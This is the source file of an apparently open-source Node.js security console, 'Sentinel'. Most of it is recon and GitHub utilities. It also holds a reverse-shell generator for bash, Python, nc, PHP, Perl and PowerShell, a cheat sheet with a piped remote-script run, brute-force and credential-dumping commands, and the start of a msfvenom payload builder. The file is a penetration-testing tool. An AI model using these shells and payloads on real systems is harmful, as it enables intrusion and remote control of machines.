#!/usr/bin/env node
"use strict";
/*!
 * Sentinel — Terminal Edition
 * A dependency-free CLI/TUI security console for Windows and Linux.
 * Uses only Node.js built-ins. MIT License. Copyright (c) 2026 Sentinel.
 * Use only on systems you own or are explicitly authorized to test.
 */
const net = require("net");
const tls = require("tls");
const http = require("http");
const https = require("https");
const { execFile, spawn } = require("child_process");
const crypto = require("crypto");
const readline = require("readline");
const os = require("os");
const dnsp = require("dns").promises;
const VERSION = "2.29.0";

// ---------- colors ----------
const useColor = process.stdout.isTTY && !process.env.NO_COLOR;
let tuiActive = false; // set while the full-screen TUI owns the terminal, so the global SIGINT handler defers to the TUI's own cleanup
const A = { reset: "\x1b[0m", b: "\x1b[1m", dim: "\x1b[2m", cyan: "\x1b[36m", green: "\x1b[32m", red: "\x1b[31m", yellow: "\x1b[33m", mag: "\x1b[35m", gray: "\x1b[90m", blue: "\x1b[34m" };
const p = (code, s) => (useColor ? code + s + A.reset : s);
const cyan = (s) => p(A.cyan, s), green = (s) => p(A.green, s), red = (s) => p(A.red, s), yellow = (s) => p(A.yellow, s), gray = (s) => p(A.gray, s), bold = (s) => p(A.b, s), mag = (s) => p(A.mag, s), blue = (s) => p(A.blue, s), dim = (s) => p(A.dim, s);

// ---------- data ----------
const SERVICES = { 21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns", 80: "http", 110: "pop3", 111: "rpcbind", 135: "msrpc", 139: "netbios", 143: "imap", 161: "snmp", 389: "ldap", 443: "https", 445: "smb", 465: "smtps", 587: "smtp", 636: "ldaps", 993: "imaps", 995: "pop3s", 1433: "mssql", 1521: "oracle", 2049: "nfs", 2375: "docker", 3306: "mysql", 3389: "rdp", 4444: "metasploit", 5432: "postgres", 5601: "kibana", 5900: "vnc", 5985: "winrm", 6379: "redis", 8000: "http-alt", 8080: "http-proxy", 8443: "https-alt", 8888: "http-alt", 9200: "elastic", 11211: "memcached", 27017: "mongodb" };
const TOP_PORTS = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 161, 389, 443, 445, 465, 587, 636, 993, 995, 1433, 1521, 2049, 2375, 3306, 3389, 4444, 5432, 5601, 5900, 5985, 6379, 8000, 8080, 8443, 8888, 9200, 11211, 27017];

const SHELLS = {
  bash: (i, o) => `bash -i >& /dev/tcp/${i}/${o} 0>&1`,
  python3: (i, o) => `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${i}",${o}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/sh")'`,
  nc: (i, o) => `nc -e /bin/sh ${i} ${o}`,
  "nc-mkfifo": (i, o) => `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${i} ${o} >/tmp/f`,
  php: (i, o) => `php -r '$s=fsockopen("${i}",${o});exec("/bin/sh -i <&3 >&3 2>&3");'`,
  perl: (i, o) => `perl -e 'use Socket;$i="${i}";$p=${o};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`,
  powershell: (i, o) => `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('${i}',${o});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($k=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$k);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}"`,
};

const CHEATS = {
  "nmap": ["nmap -sV -sC -oN scan.txt TARGET", "nmap -p- --min-rate 5000 -T4 TARGET", "nmap --script vuln TARGET"],
  "shells": ["bash -i >& /dev/tcp/IP/PORT 0>&1", "nc -lvnp 4444   # listener", "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'   # upgrade TTY"],
  "privesc": ["find / -perm -4000 -type f 2>/dev/null   # SUID", "sudo -l", "cat /etc/crontab", "curl -L .../linpeas.sh | sh"],
  "transfer": ["python3 -m http.server 8000", "curl http://IP:8000/f -o f", "wget http://IP:8000/f"],
  "web": ["gobuster dir -u http://TARGET -w common.txt", "ffuf -u http://TARGET/FUZZ -w list.txt", "sqlmap -u 'http://TARGET/?id=1' --batch --dbs"],
  "cracking": ["hashcat -m 0 hash.txt rockyou.txt", "john --wordlist=rockyou.txt hash.txt", "hydra -L users -P rockyou.txt ssh://TARGET"],
  "windows": ["evil-winrm -i TARGET -u USER -p PASS", "impacket-secretsdump DOM/USER:PASS@TARGET", "crackmapexec smb TARGET"],
};

const TOOLS = [
  ["nmap", "Recon", "sudo apt install -y nmap"],
  ["masscan", "Recon", "sudo apt install -y masscan"],
  ["gobuster", "Web", "sudo apt install -y gobuster"],
  ["ffuf", "Web", "sudo apt install -y ffuf"],
  ["nuclei", "Web", "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"],
  ["sqlmap", "Web", "sudo apt install -y sqlmap"],
  ["hydra", "Passwords", "sudo apt install -y hydra"],
  ["hashcat", "Passwords", "sudo apt install -y hashcat"],
  ["john", "Passwords", "sudo apt install -y john"],
  ["metasploit", "Exploit", "sudo apt install -y metasploit-framework"],
  ["impacket", "Post-ex", "pipx install impacket"],
  ["crackmapexec", "Post-ex", "pipx install crackmapexec"],
];

// ---------- helpers ----------
function banner() {
  const art = [
    "  ███████╗███████╗███╗   ██╗████████╗██╗███╗   ██╗███████╗██╗     ",
    "  ██╔════╝██╔════╝████╗  ██║╚══██╔══╝██║████╗  ██║██╔════╝██║     ",
    "  ███████╗█████╗  ██╔██╗ ██║   ██║   ██║██╔██╗ ██║█████╗  ██║     ",
    "  ╚════██║██╔══╝  ██║╚██╗██║   ██║   ██║██║╚██╗██║██╔══╝  ██║     ",
    "  ███████║███████╗██║ ╚████║   ██║   ██║██║ ╚████║███████╗███████╗",
    "  ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝",
  ];
  // smooth vertical cyan → violet → magenta gradient (256-color, falls back to plain)
  const grad = ["38;5;51", "38;5;45", "38;5;44", "38;5;99", "38;5;134", "38;5;170"];
  console.log("");
  if (useColor) art.forEach((l, i) => console.log("\x1b[1;" + grad[i] + "m" + l + "\x1b[0m"));
  else art.forEach((l) => console.log(l));
  console.log("  " + gray("╭─ ") + bold(cyan("security console")) + gray(" · terminal edition · ") + mag("v" + VERSION) + gray(" · ") + gray(os.platform() + "/" + os.arch()));
  console.log("  " + gray("╰─ ") + dim("only what you own or are authorized to test.") + "\n");
}
const rl = () => readline.createInterface({ input: process.stdin, output: process.stdout });
function ask(q) { return new Promise((res) => { const r = rl(); r.question(cyan("  " + q + " "), (a) => { r.close(); res(a.trim()); }); }); }
// Claude-Code-style bordered chat input box.
function chatInput() {
  return new Promise((res) => {
    const W = 58;
    process.stdout.write(cyan("  ╭─ ") + gray("you") + cyan(" " + "─".repeat(W - 6) + "╮") + "\n");
    const r = rl();
    r.question(cyan("  │ ") + mag("› "), (a) => {
      r.close();
      process.stdout.write(cyan("  ╰" + "─".repeat(W) + "╯") + "\n\n");
      res(a.trim());
    });
  });
}
function h1(t) { console.log("\n  " + bold(cyan("▌ " + t)) + "\n"); }
function ok(s) { return green("● ") + s; }
function copyHint(cmd) { console.log("  " + cmd); }

// ---------- port scanner ----------
function scan(host, ports, timeout = 900, conc = 250) {
  return new Promise((resolve) => {
    const open = []; let idx = 0, done = 0;
    const total = ports.length;
    const tick = () => { if (process.stdout.isTTY) { readline.clearLine(process.stdout, 0); readline.cursorTo(process.stdout, 0); process.stdout.write("  " + gray(`scanned ${done}/${total} · ${open.length} open`)); } };
    const probe = (port) => new Promise((r) => {
      const s = new net.Socket(); let fin = false, banner = "";
      const end = (isOpen) => { if (fin) return; fin = true; try { s.destroy(); } catch (_) {}
        if (isOpen) { open.push(port); if (process.stdout.isTTY) { readline.clearLine(process.stdout, 0); readline.cursorTo(process.stdout, 0); } console.log("  " + green(String(port).padEnd(7)) + (SERVICES[port] || "").padEnd(12) + gray(banner.slice(0, 60))); }
        r(); };
      s.setTimeout(timeout);
      s.once("connect", () => { s.once("data", (d) => { banner = d.toString("utf8").replace(/[^\x20-\x7e]/g, " ").trim(); end(true); }); setTimeout(() => end(true), 150); });
      s.once("timeout", () => end(false));
      s.once("error", () => end(false));
      try { s.connect(port, host); } catch (_) { end(false); }
    });
    const worker = async () => { while (true) { const i = idx++; if (i >= total) return; await probe(ports[i]); done++; tick(); } };
    console.log("  " + gray(`PORT   SERVICE     BANNER`));
    Promise.all(Array.from({ length: Math.min(conc, total) }, worker)).then(() => {
      if (process.stdout.isTTY) { readline.clearLine(process.stdout, 0); readline.cursorTo(process.stdout, 0); }
      console.log("  " + ok(`${open.length} open port${open.length === 1 ? "" : "s"} on ${host}`));
      if (open.length) console.log("  " + gray("nmap: ") + `nmap -sV -sC -p ${open.join(",")} ${host}`);
      resolve(open);
    });
  });
}
function parsePorts(spec) {
  if (!spec || spec === "top") return TOP_PORTS;
  const m = spec.match(/^(\d+)-(\d+)$/);
  if (m) { const a = []; for (let i = +m[1]; i <= +m[2]; i++) a.push(i); return a; }
  return spec.split(",").map(Number).filter((n) => n > 0 && n < 65536);
}

// ---------- encoders / hashes ----------
const ENC = {
  b64e: (s) => Buffer.from(s, "utf8").toString("base64"),
  b64d: (s) => Buffer.from(s, "base64").toString("utf8"),
  hexe: (s) => Buffer.from(s, "utf8").toString("hex"),
  hexd: (s) => Buffer.from(s, "hex").toString("utf8"),
  urle: (s) => encodeURIComponent(s),
  urld: (s) => decodeURIComponent(s),
};
function hashes(s) { return ["md5", "sha1", "sha256", "sha512"].map((a) => "  " + a.padEnd(8) + cyan(crypto.createHash(a).update(s).digest("hex"))).join("\n"); }
function idHash(h) {
  h = h.trim();
  if (/^\$2[aby]\$/.test(h)) return "bcrypt";
  if (/^\$6\$/.test(h)) return "sha512crypt"; if (/^\$1\$/.test(h)) return "md5crypt";
  if (/^[a-f0-9]{32}$/i.test(h)) return "MD5 or NTLM (-m 0 / -m 1000)";
  if (/^[a-f0-9]{40}$/i.test(h)) return "SHA-1 (-m 100)";
  if (/^[a-f0-9]{64}$/i.test(h)) return "SHA-256 (-m 1400)";
  if (/^[a-f0-9]{128}$/i.test(h)) return "SHA-512 (-m 1700)";
  return "unknown";
}

// ---------- recon: DNS / WHOIS / headers ----------
async function dnsLookup(host) {
  host = host.replace(/^https?:\/\//, "").split("/")[0];
  const kinds = [["A", "resolve4"], ["AAAA", "resolve6"], ["MX", "resolveMx"], ["NS", "resolveNs"], ["TXT", "resolveTxt"], ["CNAME", "resolveCname"]];
  const out = [];
  for (const [label, fn] of kinds) { try { for (const v of (await dnsp[fn](host)) || []) out.push([label, label === "MX" ? v.priority + " " + v.exchange : Array.isArray(v) ? v.join("") : v]); } catch (_) {} }
  try { const a = await dnsp.resolve4(host); if (a[0]) for (const ptr of (await dnsp.reverse(a[0]).catch(() => [])) || []) out.push(["PTR", ptr]); } catch (_) {}
  return out;
}
function whoisAsk(server, query) {
  return new Promise((res) => { const s = net.connect(43, server); let data = ""; s.setTimeout(9000);
    s.on("connect", () => s.write(query + "\r\n")); s.on("data", (d) => (data += d.toString()));
    s.on("end", () => res(data)); s.on("timeout", () => { try { s.destroy(); } catch (_) {} res(data); }); s.on("error", () => res(data)); });
}
async function whois(query) {
  query = query.replace(/^https?:\/\//, "").split("/")[0];
  let t = await whoisAsk("whois.iana.org", query);
  const ref = (t.match(/refer:\s*(\S+)/i) || [])[1] || (t.match(/whois:\s*(\S+)/i) || [])[1];
  if (ref) { const m = await whoisAsk(ref, query); if (m && m.trim()) t = m; }
  return t.trim();
}
const SEC = [["strict-transport-security", "HSTS"], ["content-security-policy", "CSP"], ["x-frame-options", "X-Frame-Options"], ["x-content-type-options", "X-Content-Type-Options"], ["referrer-policy", "Referrer-Policy"], ["permissions-policy", "Permissions-Policy"]];
async function headers(url) {
  if (!/^https?:\/\//.test(url)) url = "https://" + url;
  const r = await fetch(url, { redirect: "follow" }).catch((e) => ({ __err: e.message }));
  if (r.__err) return { err: r.__err };
  const h = {}; r.headers.forEach((v, k) => (h[k] = v));
  return { status: r.status, server: h.server || "?", h };
}

function certInspect(host) {
  host = host.replace(/^https?:\/\//, "").split("/")[0];
  return new Promise((res) => {
    let done = false; const fin = (v) => { if (done) return; done = true; res(v); };
    const s = tls.connect({ host, port: 443, servername: host, rejectUnauthorized: false, timeout: 9000 }, () => {
      const c = s.getPeerCertificate(false), flat = (o) => Object.entries(o || {}).map(([k, v]) => k + "=" + v).join(", ");
      fin({ ok: true, protocol: s.getProtocol(), cipher: (s.getCipher() || {}).name, subject: flat(c.subject), issuer: flat(c.issuer), valid_from: c.valid_from, valid_to: c.valid_to, san: (c.subjectaltname || "").replace(/DNS:/g, ""), serial: c.serialNumber, fp: c.fingerprint256, daysLeft: c.valid_to ? Math.round((new Date(c.valid_to) - Date.now()) / 86400000) : null });
      s.end();
    });
    s.on("error", (e) => fin({ ok: false, error: e.message }));
    s.on("timeout", () => { try { s.destroy(); } catch (_) {} fin({ ok: false, error: "timeout" }); });
  });
}
async function subs(domain) {
  domain = domain.replace(/^https?:\/\//, "").split("/")[0].toLowerCase();
  const ctrl = new AbortController(), to = setTimeout(() => ctrl.abort(), 20000);
  try {
    const r = await fetch("https://crt.sh/?q=%25." + encodeURIComponent(domain) + "&output=json", { signal: ctrl.signal, headers: { "User-Agent": "Sentinel" } });
    const txt = await r.text(); let data;
    try { data = JSON.parse(txt); } catch { return { err: "crt.sh is busy — try again in a moment" }; }
    const set = new Set();
    for (const e of data) for (const n of String(e.name_value || "").split("\n")) { const s = n.trim().toLowerCase(); if (s && !s.includes("*") && (s === domain || s.endsWith("." + domain))) set.add(s); }
    return [...set].sort();
  } catch (e) { return { err: e.name === "AbortError" ? "crt.sh timed out" : e.message }; }
  finally { clearTimeout(to); }
}

// ---------- content fuzzer ----------
const COMMON_PATHS = ["admin", "administrator", "login", "logout", "register", "dashboard", "api", "api/v1", "v1", "v2", ".git", ".git/config", ".env", "config", "config.php", "wp-admin", "wp-login.php", "wp-content", "phpmyadmin", "robots.txt", "sitemap.xml", "backup", "backups", "backup.zip", "db", "database", "dump.sql", "test", "dev", "staging", "uploads", "images", "assets", "js", "css", "includes", "tmp", "old", ".htaccess", ".htpasswd", "server-status", "status", "health", "healthz", "metrics", "actuator", "actuator/health", "swagger", "swagger-ui", "api-docs", "graphql", "console", "debug", "info.php", "phpinfo.php", "README.md", "CHANGELOG.md", "LICENSE", ".DS_Store", "web.config", "crossdomain.xml", ".well-known/security.txt", "users", "user", "account", "profile", "settings", "private", "secret", "internal", "portal", "cpanel", "webmail", "mail", "ftp", "git", "svn", ".svn", "vendor", "composer.json", "package.json", "Dockerfile", "docker-compose.yml", ".gitignore", "error_log", "logs", "log"];
function headReq(url, to) {
  return new Promise((res) => {
    let u; try { u = new URL(url); } catch (_) { return res(null); }
    const lib = u.protocol === "https:" ? https : http;
    const req = lib.request(u, { method: "GET", timeout: to || 8000, rejectUnauthorized: false, headers: { "User-Agent": "Sentinel" } }, (r) => { const o = { status: r.statusCode, len: r.headers["content-length"] || "", loc: r.headers["location"] || "" }; r.destroy(); res(o); });
    req.on("timeout", () => { req.destroy(); res(null); });
    req.on("error", () => res(null));
    req.end();
  });
}
async function fuzz(base, wlFile) {
  if (!base) { console.log("  " + red("usage: fuzz <url> [wordlist-file]")); return; }
  if (!/^https?:\/\//i.test(base)) base = "http://" + base;
  base = base.replace(/\/+$/, "");
  let words = COMMON_PATHS;
  if (wlFile) { try { words = require("fs").readFileSync(wlFile, "utf8").split("\n").map((s) => s.trim()).filter(Boolean); } catch (_) { console.log("  " + red("can't read " + wlFile)); return; } }
  console.log("  " + gray("fuzzing " + base + " (" + words.length + " paths)"));
  let idx = 0, found = 0;
  const color = (s) => s < 300 ? green : s < 400 ? cyan : (s === 401 || s === 403) ? yellow : gray;
  const probe = async (w) => { const r = await headReq(base + "/" + w.replace(/^\//, ""), 8000); if (r && r.status && r.status !== 404) { found++; console.log("  " + color(r.status)(String(r.status)) + "  /" + w.replace(/^\//, "") + gray(r.loc ? "  -> " + r.loc : (r.len ? "  " + r.len + "b" : ""))); } };
  const worker = async () => { while (true) { const i = idx++; if (i >= words.length) return; await probe(words[i]); } };
  await Promise.all(Array.from({ length: Math.min(25, words.length) }, worker));
  console.log("  " + ok(found + " path" + (found === 1 ? "" : "s") + " found on " + base));
}

// ---------- CVE search (NVD) ----------
function parseCve(v) {
  const c = v.cve, desc = (c.descriptions.find((d) => d.lang === "en") || c.descriptions[0] || {}).value || "";
  const m = c.metrics || {}, p = m.cvssMetricV31 || m.cvssMetricV30 || m.cvssMetricV2;
  const score = p && p[0] ? p[0].cvssData.baseScore : "", sev = p && p[0] ? (p[0].cvssData.baseSeverity || p[0].baseSeverity || "") : "";
  return { id: c.id, desc, score, sev, published: (c.published || "").slice(0, 10) };
}
async function cveSearch(q) {
  q = (q || "").trim();
  if (!q) { console.log("  " + red("usage: cve <keyword or CVE-id>")); return; }
  const isId = /^CVE-\d{4}-\d+$/i.test(q);
  const url = "https://services.nvd.nist.gov/rest/json/cves/2.0?" + (isId ? "cveId=" + q.toUpperCase() : "keywordSearch=" + encodeURIComponent(q)) + "&resultsPerPage=15";
  console.log("  " + gray("searching NVD..."));
  const r = await fetch(url, { headers: { "User-Agent": "Sentinel" } }).catch((e) => ({ __err: e.message }));
  if (r.__err) { console.log("  " + red(r.__err)); return; }
  if (!r.ok) { console.log("  " + red(r.status + (r.status === 403 ? " — NVD rate limit, wait a moment" : " " + r.statusText))); return; }
  const d = await r.json();
  if (!d.vulnerabilities || !d.vulnerabilities.length) { console.log("  " + gray("no results")); return; }
  console.log("  " + gray(d.totalResults + " total, showing " + Math.min(15, d.vulnerabilities.length)));
  d.vulnerabilities.slice(0, 15).forEach((v) => { const c = parseCve(v); const tag = c.score ? " [" + c.sev + " " + c.score + "]" : ""; console.log("  " + cyan(c.id) + yellow(tag) + " " + c.desc.slice(0, 78)); });
}

// ---------- GitHub (system git + token) ----------
function sh(args, opts) { return new Promise((res) => execFile("git", args, { maxBuffer: 1e7, ...opts }, (err, stdout, stderr) => res({ err, stdout, stderr }))); }
const ghToken = () => process.env.SENTINEL_GH_TOKEN || process.env.GITHUB_TOKEN || "";
const ghAuth = (url, t) => (t && /^https:\/\//i.test(url)) ? url.replace(/^https:\/\//i, "https://" + t + "@") : url;
const ghScrub = (s, t) => String(s || "").split(t || " __none__").join("***").trim();
async function gitClone(url) {
  if (!/^https:\/\//i.test(url)) { console.log("  " + red("use an https repo URL")); return; }
  const t = ghToken(), name = (url.split("/").pop() || "repo").replace(/\.git$/, "");
  console.log("  " + gray("cloning " + name + "..."));
  const r = await sh(["clone", ghAuth(url, t), name]);
  if (r.err) { console.log("  " + red(ghScrub(r.stderr || r.err.message, t))); return; }
  await sh(["-C", name, "remote", "set-url", "origin", url]);
  console.log("  " + ok("cloned into ./" + name));
}
async function gitPush(msg) {
  const t = ghToken();
  await sh(["add", "-A"]);
  await sh(["-c", "user.name=Sentinel", "-c", "user.email=sentinel@local", "commit", "-m", msg || "Update via Sentinel"]);
  const remote = (await sh(["remote", "get-url", "origin"])).stdout.trim();
  const branch = (await sh(["rev-parse", "--abbrev-ref", "HEAD"])).stdout.trim();
  const p = await sh(["push", ghAuth(remote, t), "HEAD:" + branch]);
  console.log("  " + (p.err ? red(ghScrub(p.stderr || p.err.message, t)) : ok("pushed to " + branch)));
}
async function gitStatus() { const r = await sh(["status", "--short", "-b"]); console.log((r.stdout || r.stderr || "").trim().split("\n").map((l) => "  " + l).join("\n")); }
async function gitPull() {
  const t = ghToken(), remote = (await sh(["remote", "get-url", "origin"])).stdout.trim();
  const r = await sh(["pull", ghAuth(remote, t)]);
  console.log("  " + (r.err ? red(ghScrub(r.stderr || r.err.message, t)) : ok("pulled\n  " + (r.stdout || "").trim())));
}
async function ghApiJson(path, method, body) {
  const t = ghToken();
  const opt = { method: method || "GET", headers: { Accept: "application/vnd.github+json", "User-Agent": "Sentinel" } };
  if (t) opt.headers.Authorization = "Bearer " + t;
  if (body) { opt.body = JSON.stringify(body); opt.headers["Content-Type"] = "application/json"; }
  const r = await fetch("https://api.github.com" + path, opt).catch((e) => ({ __err: e.message }));
  if (r.__err) return { err: r.__err };
  if (!r.ok) return { err: r.status + " " + r.statusText };
  return { data: await r.json() };
}
async function gitBranches() { const r = await sh(["branch", "-a"]); console.log((r.stdout || r.stderr || "").replace(/^/gm, "  ").trimEnd()); }
async function gitLog() { const r = await sh(["log", "--oneline", "-20", "--no-color"]); console.log((r.stdout || r.stderr || "no commits").replace(/^/gm, "  ").trimEnd()); }
async function gitDiff(file) { const r = await sh(file ? ["diff", "--no-color", "--", file] : ["diff", "--no-color"]); const t = (r.stdout || "").trimEnd(); console.log(t ? t : "  " + gray("no working-tree changes")); }
async function ghNewIssue(repo, title, body) {
  if (!repo || !repo.includes("/") || !title) { console.log("  " + red('usage: git issue <owner/repo> "title" ["body"]')); return; }
  const r = await ghApiJson("/repos/" + repo + "/issues", "POST", { title, body: body || "" });
  if (r.err) { console.log("  " + red(r.err)); return; }
  console.log("  " + ok("created #" + r.data.number) + " " + gray(r.data.html_url));
}
async function ghNewPR(title, base) {
  const remote = (await sh(["remote", "get-url", "origin"])).stdout.trim();
  const m = remote.match(/github\.com[:/]([^/]+\/[^/.]+?)(?:\.git)?$/i), repo = m && m[1];
  if (!repo) { console.log("  " + red("no github remote")); return; }
  if (!title) { console.log("  " + red('usage: git pr "title" [base]')); return; }
  const head = (await sh(["rev-parse", "--abbrev-ref", "HEAD"])).stdout.trim();
  if (!base) { const ri = await ghApiJson("/repos/" + repo); base = (ri.data && ri.data.default_branch) || "main"; }
  if (head === base) { console.log("  " + red("on base branch (" + base + ") — checkout a feature branch first")); return; }
  const r = await ghApiJson("/repos/" + repo + "/pulls", "POST", { title, head, base, body: "" });
  if (r.err) { console.log("  " + red(r.err)); return; }
  console.log("  " + ok("created PR #" + r.data.number) + " " + gray(r.data.html_url));
}
async function ghComment(repo, num, body) {
  if (!repo || !repo.includes("/") || !num || !body) { console.log("  " + red('usage: git comment <owner/repo> <number> "text"')); return; }
  const r = await ghApiJson("/repos/" + repo + "/issues/" + num + "/comments", "POST", { body });
  if (r.err) { console.log("  " + red(r.err)); return; }
  console.log("  " + ok("commented on #" + num) + " " + gray(r.data.html_url));
}
async function ghGists() {
  const r = await ghApiJson("/gists?per_page=30");
  if (r.err) { console.log("  " + red(r.err)); return; }
  if (!r.data.length) { console.log("  " + gray("no gists")); return; }
  r.data.forEach((g) => console.log("  " + (g.public ? gray("public") : yellow("secret")) + " " + (Object.keys(g.files)[0] || "gist") + gray("  " + g.html_url)));
}
async function ghNewGist(file, desc) {
  if (!file) { console.log("  " + red("usage: git gist <file> [description]")); return; }
  let content; try { content = require("fs").readFileSync(file, "utf8"); } catch (_) { console.log("  " + red("can't read " + file)); return; }
  const name = file.split(/[\\/]/).pop();
  const r = await ghApiJson("/gists", "POST", { description: desc || "", public: true, files: { [name]: { content } } });
  if (r.err) { console.log("  " + red(r.err)); return; }
  console.log("  " + ok("gist created") + " " + gray(r.data.html_url));
}
async function gitCheckout(name) {
  if (!name) { console.log("  " + red("usage: git checkout <branch>")); return; }
  const r = await sh(["checkout", name]);
  console.log("  " + (r.err ? red((r.stderr || r.err.message).trim()) : ok("switched to " + name)));
}
async function ghIssues(repo, kind) {
  if (!repo || !repo.includes("/")) { console.log("  " + red("usage: git " + (kind === "pulls" ? "prs" : "issues") + " <owner/repo>")); return; }
  const r = await ghApiJson("/repos/" + repo + "/" + (kind === "pulls" ? "pulls" : "issues") + "?state=open&per_page=25");
  if (r.err) { console.log("  " + red(r.err)); return; }
  const items = (kind === "pulls" ? r.data : r.data.filter((x) => !x.pull_request));
  if (!items.length) { console.log("  " + gray("none open")); return; }
  items.forEach((x) => console.log("  " + cyan((kind === "pulls" ? "PR#" : "#") + x.number) + " " + x.title + gray("  @" + (x.user ? x.user.login : "?"))));
}
async function ghReposList() {
  const r = await ghApiJson("/user/repos?sort=updated&per_page=100");
  if (r.err) { console.log("  " + red(r.err)); return; }
  r.data.forEach((x) => console.log("  " + (x.private ? yellow("private") : gray("public ")) + " " + bold(x.full_name) + gray("  " + x.clone_url)));
}
async function ghNewRepo(name) {
  if (!name) { console.log("  " + red("usage: git new <name>")); return; }
  const r = await ghApiJson("/user/repos", "POST", { name, private: true, auto_init: true });
  if (r.err) { console.log("  " + red(r.err)); return; }
  console.log("  " + ok("created " + r.data.full_name) + "\n  " + gray(r.data.clone_url));
}

// ---------- interactive menus ----------
async function menuScan() {
  h1("Port scanner");
  const host = await ask("host / IP:");
  if (!host) return;
  const spec = await ask("ports [top / 1-1024 / 80,443]:") || "top";
  console.log("");
  await scan(host, parsePorts(spec));
}
async function menuDns() {
  h1("DNS lookup");
  const host = await ask("domain:"); if (!host) return;
  console.log("");
  const recs = await dnsLookup(host);
  if (!recs.length) { console.log("  " + red("no records found")); return; }
  recs.forEach(([k, v]) => console.log("  " + cyan(k.padEnd(6)) + v));
}
async function menuWhois() {
  h1("WHOIS");
  const q = await ask("domain / IP:"); if (!q) return;
  console.log("\n  " + gray("querying whois..."));
  const t = await whois(q); console.log("");
  console.log(t.split("\n").slice(0, 60).map((l) => "  " + l).join("\n"));
}
async function menuHeaders() {
  h1("HTTP security headers");
  const url = await ask("url:"); if (!url) return;
  console.log("\n  " + gray("fetching..."));
  const r = await headers(url); console.log("");
  if (r.err) { console.log("  " + red(r.err)); return; }
  console.log("  " + ok(r.status + " · server: " + r.server));
  SEC.forEach(([k, label]) => { const on = r.h[k] !== undefined; console.log("  " + (on ? green("●") : red("●")) + " " + label.padEnd(24) + (on ? gray(String(r.h[k]).slice(0, 60)) : gray("missing"))); });
}
async function menuCert() {
  h1("TLS certificate");
  const host = await ask("host:"); if (!host) return;
  console.log("\n  " + gray("connecting..."));
  const c = await certInspect(host); console.log("");
  if (!c.ok) { console.log("  " + red(c.error)); return; }
  const d = c.daysLeft, exp = d == null ? "" : d < 0 ? red("EXPIRED " + -d + "d ago") : d < 21 ? yellow(d + "d left") : green(d + "d left");
  console.log("  " + ok(c.protocol + " · " + c.cipher + "  " + exp));
  [["Subject", c.subject], ["Issuer", c.issuer], ["Valid", c.valid_from + " -> " + c.valid_to], ["SAN", c.san], ["Serial", c.serial], ["SHA-256", c.fp]].forEach(([k, v]) => console.log("  " + cyan(k.padEnd(9)) + gray(String(v))));
}
async function menuSubs() {
  h1("Subdomains · certificate transparency");
  const dom = await ask("domain:"); if (!dom) return;
  console.log("\n  " + gray("querying crt.sh..."));
  const r = await subs(dom); console.log("");
  if (r.err) { console.log("  " + red(r.err)); return; }
  console.log("  " + ok(r.length + " subdomains"));
  r.forEach((s) => console.log("  " + s));
}
async function menuGit() {
  h1("GitHub");
  console.log("  token: " + (ghToken() ? green("set (env)") : red("not set — export SENTINEL_GH_TOKEN=ghp_...")));
  console.log("  actions: clone push pull status log diff branch checkout repos new issues prs issue pr comment gists gist\n");
  const act = await ask("action:");
  console.log("");
  if (act === "clone") { const url = await ask("repo url:"); if (url) { console.log(""); await gitClone(url); } }
  else if (act === "push") { const m = await ask("commit message:"); console.log(""); await gitPush(m); }
  else if (act === "pull") await gitPull();
  else if (act === "status") await gitStatus();
  else if (act === "branch") await gitBranches();
  else if (act === "checkout") { const b = await ask("branch:"); console.log(""); await gitCheckout(b); }
  else if (act === "log") await gitLog();
  else if (act === "diff") await gitDiff();
  else if (act === "issue") { const r = await ask("owner/repo:"); const t = await ask("title:"); console.log(""); await ghNewIssue(r, t); }
  else if (act === "repos") await ghReposList();
  else if (act === "new") { const n = await ask("repo name:"); console.log(""); await ghNewRepo(n); }
  else if (act === "issues") { const r = await ask("owner/repo:"); console.log(""); await ghIssues(r, "issues"); }
  else if (act === "prs") { const r = await ask("owner/repo:"); console.log(""); await ghIssues(r, "pulls"); }
  else if (act === "pr") { const t = await ask("title:"); console.log(""); await ghNewPR(t); }
  else if (act === "comment") { const r = await ask("owner/repo:"); const n = await ask("issue #:"); const t = await ask("comment:"); console.log(""); await ghComment(r, n, t); }
  else if (act === "gists") await ghGists();
  else if (act === "gist") { const f = await ask("file path:"); console.log(""); await ghNewGist(f); }
  else console.log("  " + red("unknown action"));
}
async function menuShell() {
  h1("Reverse shell generator");
  console.log("  langs: " + Object.keys(SHELLS).join(", ") + "\n");
  const lang = (await ask("lang [bash]:")) || "bash";
  const ip = (await ask("LHOST [10.0.0.1]:")) || "10.0.0.1";
  const port = (await ask("LPORT [4444]:")) || "4444";
  console.log("\n  " + (SHELLS[lang] || SHELLS.bash)(ip, port) + "\n");
  console.log("  " + gray("listener: ") + `nc -lvnp ${port}`);
}
async function menuEncode() {
  h1("Encode / decode / hash");
  console.log("  ops: b64e b64d hexe hexd urle urld hash hashid\n");
  const op = await ask("op:");
  const val = await ask("input:");
  console.log("");
  try {
    if (op === "hash") console.log(hashes(val));
    else if (op === "hashid") console.log("  " + cyan(idHash(val)));
    else if (ENC[op]) console.log("  " + cyan(ENC[op](val)));
    else console.log("  " + red("unknown op"));
  } catch (e) { console.log("  " + red("error: " + e.message)); }
}
async function menuPayloads() {
  h1("Payload builders");
  const ip = (await ask("LHOST [10.0.0.1]:")) || "10.0.0.1";
  const port = (await ask("LPORT [4444]:")) || "4444";
  console.log("");
  console.log("  " + gray("linux elf   ") + `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} -f elf -o p.elf`);
